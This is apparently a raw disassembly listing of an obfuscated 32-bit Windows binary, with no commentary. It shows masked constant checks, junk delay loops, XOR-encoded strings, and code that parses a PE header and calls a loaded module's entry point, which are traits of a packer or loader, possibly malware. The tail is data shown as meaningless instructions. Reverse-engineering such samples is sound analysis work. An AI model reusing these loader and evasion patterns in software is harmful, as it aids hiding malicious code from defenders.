  424155:	mov    ecx,0x8a29a137
  42415a:	xor    eax,ecx
  42415c:	add    DWORD PTR [ebp-0x3c],esi
  42415f:	mov    edx,DWORD PTR [ebp-0x3c]
  424162:	adc    DWORD PTR [ebp-0x38],0xffffffff
  424166:	xor    edx,ecx
  424168:	mov    DWORD PTR [ebp-0x30],edx
  42416b:	mov    edx,DWORD PTR [ebp-0x38]
  42416e:	xor    edx,0x0
  424171:	mov    DWORD PTR [ebp-0x2c],edx
  424174:	cmp    DWORD PTR [ebp-0x30],eax
  424177:	jne    0x424188
  42417d:	mov    eax,DWORD PTR [ebp-0x24]
  424180:	cmp    edx,eax
  424182:	je     0x4241b5
  424188:	mov    eax,ds:0x42f36b
  42418d:	mov    eax,DWORD PTR [eax+0x1c0]
  424193:	mov    eax,DWORD PTR [eax]
  424195:	xor    edx,edx
  424197:	add    eax,esi
  424199:	adc    edx,0xffffffff
  42419c:	xor    eax,ecx
  42419e:	xor    edx,0x0
  4241a1:	cmp    eax,0x70941fe9
  4241a6:	jne    0x424592
  4241ac:	cmp    edx,0xffffffff
  4241af:	jne    0x424592
  4241b5:	mov    eax,ds:0x42f3e7
  4241ba:	mov    edx,DWORD PTR ds:0x42f3ef
  4241c0:	xor    eax,edx
  4241c2:	mov    ds:0x42f3e7,eax
  4241c7:	mov    edx,DWORD PTR ds:0x42f3e7
  4241cd:	mov    eax,DWORD PTR [ebp-0x10]
  4241d0:	jmp    0x424552
  4241d5:	mov    eax,DWORD PTR [ebp-0x14]
  4241d8:	cmp    eax,0xf89c85b1
  4241dd:	je     0x42427c
  4241e3:	mov    eax,DWORD PTR [ebp-0x4]
  4241e6:	mov    ecx,DWORD PTR [ebp-0x18]
  4241e9:	xor    eax,edi
  4241eb:	add    eax,ebx
  4241ed:	cmp    eax,ecx
  4241ef:	je     0x42427c
  4241f5:	push   0x42fba3
  4241fa:	call   DWORD PTR ds:0x43004f
  424200:	test   eax,eax
  424202:	je     0x424216
  424208:	push   0x0
  42420a:	push   0x0
  42420c:	push   0x42fc13
  424211:	jmp    0x424606
  424216:	lea    eax,[ebp-0x70]
  424219:	push   eax
  42421a:	push   0x42fbdf
  42421f:	call   DWORD PTR ds:0x430043
  424225:	test   eax,eax
  424227:	je     0x424237
  42422d:	push   0x42fc53
  424232:	jmp    0x424629
  424237:	mov    eax,ds:0x42f36b
  42423c:	mov    eax,DWORD PTR [eax+0x194]
  424242:	mov    ecx,DWORD PTR [eax]
  424244:	mov    eax,DWORD PTR [ecx+0x3c]
  424247:	push   DWORD PTR ds:0x42f443
  42424d:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  424251:	push   DWORD PTR ds:0x42f1ef
  424257:	add    eax,ecx
  424259:	mov    ecx,DWORD PTR ds:0x42f36b
  42425f:	mov    ecx,DWORD PTR [ecx+0x194]
  424265:	push   DWORD PTR [ecx]
  424267:	call   eax
  424269:	mov    ecx,DWORD PTR ds:0x42f36b
  42426f:	mov    ecx,DWORD PTR [ecx+0x1cc]
  424275:	mov    DWORD PTR [ecx],eax
  424277:	jmp    0x424592
  42427c:	push   0x42f6f3
  424281:	call   DWORD PTR ds:0x43004f
  424287:	test   eax,eax
  424289:	je     0x42429d
  42428f:	push   0x0
  424291:	push   0x0
  424293:	push   0x42f763
  424298:	jmp    0x424606
  42429d:	mov    esi,DWORD PTR ds:0x430043
  4242a3:	lea    eax,[ebp-0x70]
  4242a6:	push   eax
  4242a7:	push   0x42f72f
  4242ac:	call   esi
  4242ae:	test   eax,eax
  4242b0:	je     0x4242c0
  4242b6:	push   0x42f7a3
  4242bb:	jmp    0x424629
  4242c0:	mov    eax,DWORD PTR [ebp-0x4]
  4242c3:	mov    ecx,DWORD PTR [ebp-0x34]
  4242c6:	xor    eax,edi
  4242c8:	add    eax,ebx
  4242ca:	cmp    eax,ecx
  4242cc:	jne    0x4243a9
  4242d2:	mov    eax,DWORD PTR [ebp-0x4]
  4242d5:	mov    ecx,DWORD PTR ds:0x42f36b
  4242db:	mov    ecx,DWORD PTR [ecx+0x198]
  4242e1:	xor    eax,edi
  4242e3:	add    eax,ebx
  4242e5:	cmp    eax,DWORD PTR [ecx]
  4242e7:	jne    0x424348
  4242ed:	push   0x42f7bb
  4242f2:	call   DWORD PTR ds:0x43004f
  4242f8:	test   eax,eax
  4242fa:	je     0x42430e
  424300:	push   0x0
  424302:	push   0x0
  424304:	push   0x42f82b
  424309:	jmp    0x424606
  42430e:	lea    eax,[ebp-0x70]
  424311:	push   eax
  424312:	push   0x42f7f7
  424317:	call   esi
  424319:	test   eax,eax
  42431b:	je     0x42432b
  424321:	push   0x42f86b
  424326:	jmp    0x424629
  42432b:	mov    eax,DWORD PTR [ebp-0x4]
  42432e:	push   0xf89c85b0
  424333:	xor    eax,edi
  424335:	add    eax,ebx
  424337:	push   eax
  424338:	push   0xf89c85bc
  42433d:	push   DWORD PTR [ebp-0x8]
  424340:	push   DWORD PTR [ebp-0x4]
  424343:	call   0x4231be
  424348:	push   0x42f883
  42434d:	call   DWORD PTR ds:0x43004f
  424353:	test   eax,eax
  424355:	je     0x424369
  42435b:	push   0x0
  42435d:	push   0x0
  42435f:	push   0x42f8f3
  424364:	jmp    0x424606
  424369:	lea    eax,[ebp-0x70]
  42436c:	push   eax
  42436d:	push   0x42f8bf
  424372:	call   esi
  424374:	test   eax,eax
  424376:	je     0x424386
  42437c:	push   0x42f933
  424381:	jmp    0x424629
  424386:	push   DWORD PTR [ebp-0x8]
  424389:	push   DWORD PTR [ebp-0x4]
  42438c:	call   0x401000
  424391:	mov    eax,DWORD PTR [ebp-0x4]
  424394:	xor    eax,edi
  424396:	add    eax,ebx
  424398:	mov    ds:0x42f3ef,eax
  42439d:	mov    eax,DWORD PTR [ebp-0x4]
  4243a0:	xor    eax,edi
  4243a2:	add    eax,ebx
  4243a4:	mov    ds:0x42f3e7,eax
  4243a9:	lea    eax,[ebp-0x1c]
  4243ac:	mov    DWORD PTR [ebp-0x44],eax
  4243af:	lea    eax,[ebp+0x4]
  4243b2:	push   0x42f94b
  4243b7:	mov    DWORD PTR [ebp-0x1c],eax
  4243ba:	call   DWORD PTR ds:0x43004f
  4243c0:	test   eax,eax
  4243c2:	je     0x4243d6
  4243c8:	push   0x0
  4243ca:	push   0x0
  4243cc:	push   0x42f9bb
  4243d1:	jmp    0x424606
  4243d6:	lea    eax,[ebp-0x70]
  4243d9:	push   eax
  4243da:	push   0x42f987
  4243df:	call   esi
  4243e1:	test   eax,eax
  4243e3:	je     0x4243f3
  4243e9:	push   0x42f9fb
  4243ee:	jmp    0x424629
  4243f3:	mov    eax,DWORD PTR [ebp-0x1c]
  4243f6:	test   eax,eax
  4243f8:	je     0x424592
  4243fe:	push   0x42fa13
  424403:	call   DWORD PTR ds:0x43004f
  424409:	test   eax,eax
  42440b:	je     0x42441f
  424411:	push   0x0
  424413:	push   0x0
  424415:	push   0x42fa83
  42441a:	jmp    0x424606
  42441f:	mov    esi,DWORD PTR ds:0x430043
  424425:	lea    eax,[ebp-0x70]
  424428:	push   eax
  424429:	push   0x42fa4f
  42442e:	call   esi
  424430:	test   eax,eax
  424432:	je     0x424442
  424438:	push   0x42fac3
  42443d:	jmp    0x424629
  424442:	mov    DWORD PTR [ebp-0x48],0xf152c39
  424449:	mov    DWORD PTR [ebp-0x4c],0x712ed2e
  424450:	mov    DWORD PTR [ebp-0x50],0x373fc08
  424457:	mov    DWORD PTR [ebp-0x54],0x72670ad8
  42445e:	call   0x421f87
  424463:	push   0x42fadb
  424468:	call   DWORD PTR ds:0x43004f
  42446e:	test   eax,eax
  424470:	je     0x424484
  424476:	push   0x0
  424478:	push   0x0
  42447a:	push   0x42fb4b
  42447f:	jmp    0x424606
  424484:	lea    eax,[ebp-0x70]
  424487:	push   eax
  424488:	push   0x42fb17
  42448d:	call   esi
  42448f:	test   eax,eax
  424491:	je     0x4244a1
  424497:	push   0x42fb8b
  42449c:	jmp    0x424629
  4244a1:	mov    eax,DWORD PTR [ebp-0xc]
  4244a4:	mov    eax,DWORD PTR [ebp-0x8]
  4244a7:	mov    eax,DWORD PTR [ebp-0x4]
  4244aa:	mov    DWORD PTR [ebp+0xc],eax
  4244ad:	mov    eax,eax
  4244af:	mov    eax,ds:0x42f36b
  4244b4:	mov    eax,DWORD PTR [eax+0x1c8]
  4244ba:	mov    eax,DWORD PTR [eax]
  4244bc:	cdq    
  4244bd:	mov    esi,0xfabdbedd
  4244c2:	add    eax,esi
  4244c4:	adc    edx,0xffffffff
  4244c7:	and    DWORD PTR [ebp-0x38],0x0
  4244cb:	xor    edx,0x0
  4244ce:	mov    DWORD PTR [ebp-0x24],edx
  4244d1:	mov    edx,DWORD PTR [ebp+0xc]
  4244d4:	mov    DWORD PTR [ebp-0x3c],edx
  4244d7:	mov    ecx,0x8a29a137
  4244dc:	xor    eax,ecx
  4244de:	add    DWORD PTR [ebp-0x3c],esi
  4244e1:	mov    edx,DWORD PTR [ebp-0x3c]
  4244e4:	adc    DWORD PTR [ebp-0x38],0xffffffff
  4244e8:	xor    edx,ecx
  4244ea:	mov    DWORD PTR [ebp-0x30],edx
  4244ed:	mov    edx,DWORD PTR [ebp-0x38]
  4244f0:	xor    edx,0x0
  4244f3:	mov    DWORD PTR [ebp-0x2c],edx
  4244f6:	cmp    DWORD PTR [ebp-0x30],eax
  4244f9:	jne    0x42450a
  4244ff:	mov    eax,DWORD PTR [ebp-0x24]
  424502:	cmp    edx,eax
  424504:	je     0x424537
  42450a:	mov    eax,ds:0x42f36b
  42450f:	mov    eax,DWORD PTR [eax+0x1c0]
  424515:	mov    eax,DWORD PTR [eax]
  424517:	xor    edx,edx
  424519:	add    eax,esi
  42451b:	adc    edx,0xffffffff
  42451e:	xor    eax,ecx
  424520:	xor    edx,0x0
  424523:	cmp    eax,0x70941fe9
  424528:	jne    0x424592
  42452e:	cmp    edx,0xffffffff
  424531:	jne    0x424592
  424537:	mov    eax,ds:0x42f3e7
  42453c:	mov    edx,DWORD PTR ds:0x42f3ef
  424542:	xor    eax,edx
  424544:	mov    ds:0x42f3e7,eax
  424549:	mov    edx,DWORD PTR ds:0x42f3e7
  42454f:	mov    eax,DWORD PTR [ebp-0x1c]
  424552:	add    DWORD PTR [eax],edx
  424554:	mov    edx,DWORD PTR [ebp+0xc]
  424557:	mov    eax,ds:0x42f3e7
  42455c:	xor    edx,edi
  42455e:	add    edx,ebx
  424560:	xor    ebx,ebx
  424562:	add    edx,esi
  424564:	adc    ebx,0xffffffff
  424567:	xor    edi,edi
  424569:	xor    edx,ecx
  42456b:	xor    ebx,0x0
  42456e:	add    eax,esi
  424570:	adc    edi,0xffffffff
  424573:	xor    eax,ecx
  424575:	xor    edi,0x0
  424578:	cmp    eax,edx
  42457a:	jne    0x424592
  424580:	cmp    edi,ebx
  424582:	jne    0x424592
  424588:	mov    eax,ds:0x42f3e7
  42458d:	mov    ds:0x42f3ef,eax
  424592:	mov    edi,DWORD PTR ds:0x43004f
  424598:	push   0x42fc6b
  42459d:	call   edi
  42459f:	test   eax,eax
  4245a1:	je     0x4245b5
  4245a7:	push   0x0
  4245a9:	push   0x0
  4245ab:	push   0x42fcdb
  4245b0:	jmp    0x424606
  4245b5:	mov    esi,DWORD PTR ds:0x430043
  4245bb:	lea    eax,[ebp-0x70]
  4245be:	push   eax
  4245bf:	push   0x42fca7
  4245c4:	call   esi
  4245c6:	test   eax,eax
  4245c8:	je     0x4245d8
  4245ce:	push   0x42fd1b
  4245d3:	jmp    0x424629
  4245d8:	mov    eax,ds:0x42f36b
  4245dd:	push   0x4
  4245df:	add    eax,0x1cc
  4245e4:	push   eax
  4245e5:	lea    eax,[ebp-0xc]
  4245e8:	push   eax
  4245e9:	call   0x424640
  4245ee:	push   0x42fd33
  4245f3:	call   edi
  4245f5:	test   eax,eax
  4245f7:	je     0x424611
  4245fd:	push   0x0
  4245ff:	push   0x0
  424601:	push   0x42fda3
  424606:	call   DWORD PTR ds:0x43001f
  42460c:	jmp    0x424639
  424611:	lea    eax,[ebp-0x70]
  424614:	push   eax
  424615:	push   0x42fd6f
  42461a:	call   esi
  42461c:	test   eax,eax
  42461e:	je     0x424634
  424624:	push   0x42fde3
  424629:	call   DWORD PTR ds:0x430023
  42462f:	jmp    0x424639
  424634:	mov    eax,DWORD PTR [ebp-0xc]
  424637:	mov    eax,DWORD PTR [eax]
  424639:	pop    ebx
  42463a:	pop    esi
  42463b:	pop    edi
  42463c:	leave  
  42463d:	ret    0xc
  424640:	push   ebp
  424641:	mov    ebp,esp
  424643:	sub    esp,0x10
  424646:	add    edx,0x3c01
  42464c:	mov    eax,0xf89c85b0
  424651:	and    ecx,edx
  424653:	mov    DWORD PTR [ebp-0x4],eax
  424656:	mov    ecx,DWORD PTR ds:0x424b25
  42465c:	mov    edx,DWORD PTR ds:0x42e010
  424662:	sub    edx,ecx
  424664:	xor    ecx,DWORD PTR [ecx+edx*1]
  424667:	mov    DWORD PTR [ebp-0x8],0xf89c85b1
  42466e:	xor    edx,edx
  424670:	xor    edx,DWORD PTR ds:0x42b01c
  424676:	adc    DWORD PTR ds:0x429028,edx
  42467c:	mov    ecx,DWORD PTR [ebp-0x4]
  42467f:	and    DWORD PTR ds:0x42d018,0x0
  424689:	jmp    0x42469b
  42468e:	mov    edx,DWORD PTR ds:0x42d018
  424694:	inc    edx
  424695:	mov    DWORD PTR ds:0x42d018,edx
  42469b:	cmp    DWORD PTR ds:0x42d018,0x1d
  4246a2:	jae    0x4246d0
  4246a8:	cmp    DWORD PTR ds:0x42d018,0x20
  4246af:	jg     0x4246d0
  4246b5:	jmp    0x4246cb
  4246ba:	push   DWORD PTR [ebp-0x20]
  4246bd:	push   DWORD PTR [ebp-0x28]
  4246c0:	push   0x1361
  4246c5:	call   DWORD PTR ds:0x43004b
  4246cb:	jmp    0x42468e
  4246d0:	push   esi
  4246d1:	dec    esi
  4246d2:	mov    edx,0x75108a4
  4246d7:	xor    DWORD PTR ds:0x42a00c,ebx
  4246dd:	xor    ecx,edx
  4246df:	or     DWORD PTR ds:0x429010,0x14eb
  4246e9:	mov    esi,0x3272ec
  4246ee:	push   edi
  4246ef:	dec    DWORD PTR ds:0x429018
  4246f5:	mov    edi,DWORD PTR [ebp+0x10]
  4246f8:	adc    DWORD PTR ds:0x42d018,0x42901c
  424702:	add    ecx,esi
  424704:	cmp    ecx,edi
  424706:	mov    DWORD PTR ds:0x42d000,0x260f
  424710:	je     0x42485a
  424716:	mov    ecx,DWORD PTR [ebp-0x4]
  424719:	adc    DWORD PTR ds:0x42a01c,0x4985
  424723:	mov    edi,DWORD PTR [ebp+0x10]
  424726:	add    DWORD PTR ds:0x42b000,0x42c018
  424730:	xor    eax,eax
  424732:	or     DWORD PTR ds:0x42a004,0x42c000
  42473c:	xor    ecx,edx
  42473e:	or     DWORD PTR ds:0x42b018,0x42c004
  424748:	add    ecx,esi
  42474a:	xor    DWORD PTR ds:0x42d004,0x429014
  424754:	add    edi,0xfabdbedd
  42475a:	mov    DWORD PTR ds:0x42c01c,0x199c
  424764:	adc    eax,0xffffffff
  424767:	sbb    DWORD PTR ds:0x42a010,0x429004
  424771:	xor    eax,0x0
  424774:	xor    DWORD PTR ds:0x429008,0x429004
  42477e:	mov    DWORD PTR [ebp-0xc],eax
  424781:	mov    eax,ds:0x42d000
  424786:	xor    DWORD PTR ds:0x42c010,eax
  42478c:	push   ebx
  42478d:	sub    DWORD PTR ds:0x42a01c,0x1608
  424797:	xor    ebx,ebx
  424799:	sub    eax,DWORD PTR ds:0x42a000
  42479f:	xor    edi,0x8a29a137
  4247a5:	add    eax,DWORD PTR ds:0x42b01c
  4247ab:	mov    eax,ecx
  4247ad:	sbb    DWORD PTR ds:0x42a010,0x7666
  4247b7:	add    eax,0xfabdbedd
  4247bc:	mov    DWORD PTR ds:0x42b000,0x3a3b
  4247c6:	adc    ebx,0xffffffff
  4247c9:	xor    eax,0x8a29a137
  4247ce:	xor    ebx,0x0
  4247d1:	cmp    eax,edi
  4247d3:	jne    0x4247ec
  4247d9:	cmp    ebx,DWORD PTR [ebp-0xc]
  4247dc:	je     0x424854
  4247e2:	jmp    0x4247ec
  4247e7:	mov    esi,0x3272ec
  4247ec:	mov    eax,DWORD PTR [ebp-0x4]
  4247ef:	mov    edi,DWORD PTR [ebp-0x8]
  4247f2:	xor    edi,edx
  4247f4:	add    edi,esi
  4247f6:	mov    esi,DWORD PTR [ebp+0x8]
  4247f9:	imul   edi,ecx
  4247fc:	mov    ebx,DWORD PTR [ebp+0xc]
  4247ff:	xor    eax,edx
  424801:	add    eax,ecx
  424803:	mov    al,BYTE PTR [ebx+eax*1+0x3272ec]
  42480a:	mov    BYTE PTR [edi+esi*1],al
  42480d:	mov    eax,DWORD PTR [ebp-0x8]
  424810:	mov    esi,DWORD PTR [ebp+0x10]
  424813:	xor    eax,edx
  424815:	xor    ebx,ebx
  424817:	add    esi,0xfabdbedd
  42481d:	adc    ebx,0xffffffff
  424820:	lea    ecx,[ecx+eax*1+0x3272ec]
  424827:	xor    edi,edi
  424829:	xor    esi,0x8a29a137
  42482f:	xor    ebx,0x0
  424832:	mov    eax,ecx
  424834:	add    eax,0xfabdbedd
  424839:	adc    edi,0xffffffff
  42483c:	xor    eax,0x8a29a137
  424841:	xor    edi,0x0
  424844:	cmp    eax,esi
  424846:	jne    0x4247e7
  42484c:	cmp    edi,ebx
  42484e:	jne    0x4247e7
  424854:	mov    eax,0xf89c85b1
  424859:	pop    ebx
  42485a:	pop    edi
  42485b:	pop    esi
  42485c:	leave  
  42485d:	ret    0xc
  424860:	push   ebp
  424861:	mov    ebp,esp
  424863:	push   ecx
  424864:	xor    DWORD PTR ds:0x42d000,edi
  42486a:	mov    DWORD PTR [ebp-0x4],0xf89c85b0
  424871:	and    DWORD PTR ds:0x42d018,0x0
  42487b:	jmp    0x42488b
  424880:	mov    eax,ds:0x42d018
  424885:	inc    eax
  424886:	mov    ds:0x42d018,eax
  42488b:	cmp    DWORD PTR ds:0x42d018,0x14
  424892:	jae    0x4248bf
  424898:	cmp    DWORD PTR ds:0x42d018,0x20
  42489f:	jg     0x4248bf
  4248a5:	jmp    0x4248ba
  4248aa:	push   0x42d008
  4248af:	push   0x42f14f
  4248b4:	call   DWORD PTR ds:0x43000b
  4248ba:	jmp    0x424880
  4248bf:	mov    eax,DWORD PTR [ebp+0x8]
  4248c2:	movsx  eax,BYTE PTR [eax]
  4248c5:	mov    edx,0x3272ec
  4248ca:	or     DWORD PTR ds:0x42a010,ebx
  4248d0:	sub    eax,edx
  4248d2:	mov    ecx,0x75108a4
  4248d7:	dec    DWORD PTR ds:0x429008
  4248dd:	xor    eax,ecx
  4248df:	mov    DWORD PTR ds:0x429024,0x52d3
  4248e9:	cmp    eax,0xf89c85c5
  4248ee:	mov    DWORD PTR ds:0x42d004,0x21a1
  4248f8:	jne    0x424927
  4248fe:	mov    eax,DWORD PTR [ebp+0x8]
  424901:	push   esi
  424902:	mov    esi,DWORD PTR [ebp+0x8]
  424905:	add    esi,DWORD PTR [eax+0x3c]
  424908:	mov    DWORD PTR [ebp+0x8],esi
  42490b:	mov    eax,DWORD PTR [ebp-0x4]
  42490e:	mov    esi,DWORD PTR [ebp+0x8]
  424911:	xor    eax,ecx
  424913:	add    eax,edx
  424915:	cmp    DWORD PTR [esi+0x54],eax
  424918:	pop    esi
  424919:	je     0x424927
  42491f:	mov    eax,DWORD PTR [ebp+0x8]
  424922:	jmp    0x42492e
  424927:	mov    eax,DWORD PTR [ebp-0x4]
  42492a:	xor    eax,ecx
  42492c:	add    eax,edx
  42492e:	leave  
  42492f:	ret    0x4
  424932:	push   ebp
  424933:	mov    ebp,esp
  424935:	sub    esp,0xc
  424938:	sbb    ecx,0x4428
  42493e:	push   esi
  42493f:	add    esi,0x35e8
  424945:	mov    esi,0xf89c85b0
  42494a:	or     DWORD PTR ds:0x42d008,edi
  424950:	mov    DWORD PTR [ebp-0x8],esi
  424953:	mov    DWORD PTR [ebp-0x4],0xf89c85b1
  42495a:	push   edi
  42495b:	and    DWORD PTR ds:0x42c004,0x0
  424965:	mov    edx,DWORD PTR ds:0x42c004
  42496b:	inc    edx
  42496c:	mov    DWORD PTR ds:0x42c004,edx
  424972:	cmp    DWORD PTR ds:0x42c004,0x8
  424979:	jl     0x4249bb
  42497f:	jmp    0x424994
  424984:	push   0x429014
  424989:	push   0x86a8
  42498e:	call   DWORD PTR ds:0x43000f
  424994:	cmp    DWORD PTR ds:0x42c004,0x7
  42499b:	jne    0x4249ae
  4249a1:	mov    edx,DWORD PTR ds:0x42c004
  4249a7:	inc    edx
  4249a8:	mov    DWORD PTR ds:0x42c004,edx
  4249ae:	cmp    DWORD PTR ds:0x42c004,0x14
  4249b5:	jb     0x424965
  4249bb:	mov    eax,eax
  4249bd:	xor    eax,eax
  4249bf:	or     eax,DWORD PTR ds:0x429028
  4249c5:	adc    eax,DWORD PTR ds:0x42a000
  4249cb:	mov    ds:0x429028,eax
  4249d0:	mov    eax,DWORD PTR [ebp-0x4]
  4249d3:	mov    edi,DWORD PTR [ebp-0x8]
  4249d6:	not    edx
  4249d8:	mov    ecx,0x75108a4
  4249dd:	mov    DWORD PTR ds:0x42c01c,0x19
  4249e7:	cmp    DWORD PTR ds:0x42c01c,0x0
  4249ee:	je     0x424a38
  4249f4:	cmp    DWORD PTR ds:0x42c01c,0x3
  4249fb:	jg     0x424a38
  424a01:	jmp    0x424a0c
  424a06:	call   DWORD PTR ds:0x430013
  424a0c:	cmp    DWORD PTR ds:0x42c01c,0x4
  424a13:	jne    0x424a26
  424a19:	mov    edx,DWORD PTR ds:0x42c01c
  424a1f:	dec    edx
  424a20:	mov    DWORD PTR ds:0x42c01c,edx
  424a26:	mov    edx,DWORD PTR ds:0x42c01c
  424a2c:	dec    edx
  424a2d:	mov    DWORD PTR ds:0x42c01c,edx
  424a33:	jmp    0x4249e7
  424a38:	xor    eax,ecx
  424a3a:	xor    DWORD PTR ds:0x429018,0x18a1
  424a44:	xor    edi,ecx
  424a46:	mov    DWORD PTR ds:0x42b010,0x4247
  424a50:	mov    edx,0x3272ec
  424a55:	add    edi,edx
  424a57:	add    eax,edx
  424a59:	imul   eax,edi
  424a5c:	mov    edi,DWORD PTR [ebp+0xc]
  424a5f:	cmp    edi,eax
  424a61:	je     0x424ab6
  424a67:	mov    DWORD PTR [ebp-0xc],esi
  424a6a:	mov    eax,DWORD PTR [ebp-0xc]
  424a6d:	mov    esi,DWORD PTR [ebp+0xc]
  424a70:	xor    eax,ecx
  424a72:	lea    eax,[eax*8+0x19397d8]
  424a79:	mov    eax,DWORD PTR [esi+eax*1]
  424a7c:	mov    DWORD PTR [ebp+0xc],eax
  424a7f:	mov    eax,DWORD PTR [ebp-0x4]
  424a82:	mov    esi,DWORD PTR [ebp-0x8]
  424a85:	xor    eax,ecx
  424a87:	xor    esi,ecx
  424a89:	add    esi,edx
  424a8b:	add    eax,edx
  424a8d:	imul   eax,esi
  424a90:	mov    esi,DWORD PTR [ebp+0xc]
  424a93:	cmp    esi,eax
  424a95:	je     0x424ab6
  424a9b:	mov    eax,DWORD PTR [ebp-0x4]
  424a9e:	xor    eax,ecx
  424aa0:	mov    ecx,DWORD PTR [ebp+0xc]
  424aa3:	add    eax,edx
  424aa5:	imul   eax,ecx
  424aa8:	add    eax,DWORD PTR [ebp+0x8]
  424aab:	mov    DWORD PTR [ebp+0xc],eax
  424aae:	mov    eax,DWORD PTR [ebp+0xc]
  424ab1:	jmp    0x424ac7
  424ab6:	mov    eax,DWORD PTR [ebp-0x4]
  424ab9:	mov    esi,DWORD PTR [ebp-0x8]
  424abc:	xor    esi,ecx
  424abe:	xor    eax,ecx
  424ac0:	add    esi,edx
  424ac2:	add    eax,edx
  424ac4:	imul   eax,esi
  424ac7:	pop    edi
  424ac8:	pop    esi
  424ac9:	leave  
  424aca:	ret    0x8
  424acd:	add    BYTE PTR [eax-0x6ffbffbe],dl
  424ad3:	inc    edx
  424ad4:	add    BYTE PTR [eax],cl
  424ad6:	nop
  424ad7:	inc    edx
  424ad8:	add    BYTE PTR [eax+edx*4],cl
  424adb:	inc    edx
  424adc:	add    BYTE PTR [eax],dl
  424ade:	nop
  424adf:	inc    edx
  424ae0:	add    BYTE PTR [eax+edx*4],dl
  424ae3:	inc    edx
  424ae4:	add    BYTE PTR [eax],bl
  424ae6:	nop
  424ae7:	inc    edx
  424ae8:	add    BYTE PTR [eax+edx*4],bl
  424aeb:	inc    edx
  424aec:	add    BYTE PTR [eax],ah
  424aee:	nop
  424aef:	inc    edx
  424af0:	add    BYTE PTR [eax+edx*4],ah
  424af3:	inc    edx
  424af4:	add    BYTE PTR [eax],ch
  424af6:	nop
  424af7:	inc    edx
  424af8:	add    BYTE PTR [eax],al
  424afa:	mov    al,0x42
  424afc:	add    BYTE PTR [eax+esi*4],al
  424aff:	inc    edx
  424b00:	add    BYTE PTR [eax],cl
  424b02:	mov    al,0x42
  424b04:	add    BYTE PTR [eax+esi*4],cl
  424b07:	inc    edx
  424b08:	add    BYTE PTR [eax],dl
  424b0a:	mov    al,0x42
  424b0c:	add    BYTE PTR [eax+esi*4],dl
  424b0f:	inc    edx
  424b10:	add    BYTE PTR [eax],bl
  424b12:	mov    al,0x42
  424b14:	add    BYTE PTR [eax+esi*4],bl
  424b17:	inc    edx
  424b18:	add    BYTE PTR [eax],al
  424b1a:	mov    al,ds:0xa0040042
  424b1f:	inc    edx
  424b20:	add    BYTE PTR [eax],cl
  424b22:	mov    al,ds:0xa00c0042
  424b27:	inc    edx
  424b28:	add    BYTE PTR [eax],dl
  424b2a:	mov    al,ds:0xa0140042
  424b2f:	inc    edx
  424b30:	add    BYTE PTR [eax],bl
  424b32:	mov    al,ds:0xa01c0042
  424b37:	inc    edx
	...
  424b44:	mov    al,ds:0x4d300b
  424b49:	add    BYTE PTR [eax],al
  424b4b:	add    BYTE PTR [edx],al
  424b4d:	add    BYTE PTR [eax],al
  424b4f:	add    BYTE PTR [esi],dh
  424b51:	add    BYTE PTR [eax],al
  424b53:	add    BYTE PTR [eax-0x7ffffdb5],al
  424b59:	aas    
  424b5a:	add    al,BYTE PTR [eax]
  424b5c:	add    al,al
  424b5e:	inc    edx
  424b5f:	add    BYTE PTR [eax+eax*8],al
  424b62:	inc    edx
  424b63:	add    BYTE PTR [eax],cl
  424b65:	rol    BYTE PTR [edx+0x0],0xc
  424b69:	rol    BYTE PTR [edx+0x0],0x10
  424b6d:	rol    BYTE PTR [edx+0x0],0x14
  424b71:	rol    BYTE PTR [edx+0x0],0x18
  424b75:	rol    BYTE PTR [edx+0x0],0x1c
  424b79:	rol    BYTE PTR [edx+0x0],0x0
  424b7d:	add    BYTE PTR [eax],al
  424b7f:	add    BYTE PTR [edx+0x53],dl
  424b82:	inc    esp
  424b83:	push   ebx
  424b84:	hlt    
  424b85:	loop   0x424b43
  424b87:	jno    0x424b1c
  424b89:	das    
  424b8a:	inc    esi
  424b8b:	dec    eax
  424b8c:	call   0x1fee:0x2265f079
  424b93:	leave  
  424b94:	add    DWORD PTR [eax],eax
  424b96:	add    BYTE PTR [eax],al
  424b98:	inc    ebp
  424b99:	cmp    bl,BYTE PTR [esp+eax*2+0x65]
  424b9d:	ins    BYTE PTR es:[edi],dx
  424b9e:	gs je  0x424c06
  424ba1:	and    BYTE PTR [ecx+eiz*2+0x74],al
  424ba5:	popa   
  424ba6:	and    BYTE PTR [ecx+ebp*2+0x72],al
  424baa:	pop    esp
  424bab:	inc    ecx
  424bac:	data16 je 0x424c14
  424baf:	jb     0x424c01
  424bb1:	popa   
  424bb2:	jb     0x424c28
  424bb4:	jns    0x424bb6
  424bb6:	mov    edx,DWORD PTR [ebp-0x14]
  424bb9:	sub    esp,0x108
  424bbf:	push   ebx
  424bc0:	mov    eax,ebx
  424bc2:	xchg   ecx,eax
  424bc3:	mov    eax,DWORD PTR [ebp+0x8]
  424bc6:	cmp    eax,0xf89c85b0
  424bcb:	jne    0x425052
  424bd1:	mov    eax,DWORD PTR [ebp+0xc]
  424bd4:	cmp    eax,0xf89c85b1
  424bd9:	jne    0x425052
  424bdf:	mov    eax,DWORD PTR [ebp+0x24]
  424be2:	mov    DWORD PTR [ebp-0x4],eax
  424be5:	mov    BYTE PTR [ebp-0x18],0x13
  424be9:	mov    BYTE PTR [ebp-0x17],0x1e
  424bed:	mov    BYTE PTR [ebp-0x16],0x15
  424bf1:	mov    BYTE PTR [ebp-0x15],0x4f
  424bf5:	mov    BYTE PTR [ebp-0x14],0x4c
  424bf9:	mov    BYTE PTR [ebp-0x13],0x7a
  424bfd:	mov    BYTE PTR [ebp-0x20],0x1
  424c01:	mov    BYTE PTR [ebp-0x1f],0xf
  424c05:	mov    BYTE PTR [ebp-0x1e],0x11
  424c09:	mov    BYTE PTR [ebp-0x1d],0xc
  424c0d:	mov    BYTE PTR [ebp-0x1c],0x4f
  424c11:	mov    BYTE PTR [ebp-0x1b],0x4c
  424c15:	mov    BYTE PTR [ebp-0x1a],0x7a
  424c19:	mov    BYTE PTR [ebp-0x28],0xf
  424c1d:	mov    BYTE PTR [ebp-0x27],0x12
  424c21:	mov    BYTE PTR [ebp-0x26],0x16
  424c25:	mov    BYTE PTR [ebp-0x25],0x3
  424c29:	mov    BYTE PTR [ebp-0x24],0x1d
  424c2d:	mov    BYTE PTR [ebp-0x23],0xa
  424c31:	push   esi
  424c32:	mov    BYTE PTR [ebp-0x22],0x15
  424c36:	mov    BYTE PTR [ebp-0x21],0x7a
  424c3a:	xor    esi,esi
  424c3c:	mov    eax,0xfd
  424c41:	lea    ecx,[ebp+esi*1-0x18]
  424c45:	movzx  edx,BYTE PTR [ecx]
  424c48:	xor    edx,0x79
